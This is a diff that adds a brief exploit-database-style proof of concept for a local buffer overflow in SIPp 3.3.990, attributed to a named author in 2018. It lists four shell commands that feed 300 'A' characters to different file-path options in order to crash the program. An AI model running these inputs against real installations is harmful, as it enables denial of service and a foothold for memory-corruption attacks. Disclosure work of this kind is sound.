@@ -1,0 +1,23 @@
+# Exploit Title: SIPp 3.3.990 - Local Buffer Overflow (PoC)
+# Date: 2018-10-29
+# Exploit Author: Nawaf Alkeraithe
+# Vendor Homepage: http://sipp.sourceforge.net/
+# Software Link:
+https://sourceforge.net/projects/sipp/files/sipp/3.4/sipp-3.3.990.tar.gz/download
+<https://github.com/SIPp/sipp/releases>
+# Version: SIPp v3.4-beta1 (aka v3.3.990)-SCTP-PCAP built Oct 29 2018
+# Tested on: 3.3.990
+
+$ ./sipp -trace_logs $(python -c 'print "A"*300')
+
+
+
+$ ./sipp -message_file $(python -c 'print "A"*300')
+
+
+
+$ ./sipp -calldebug_file $(python -c 'print "A"*300')
+
+
+
+$ ./sipp -trace_err $(python -c 'print "A"*300')
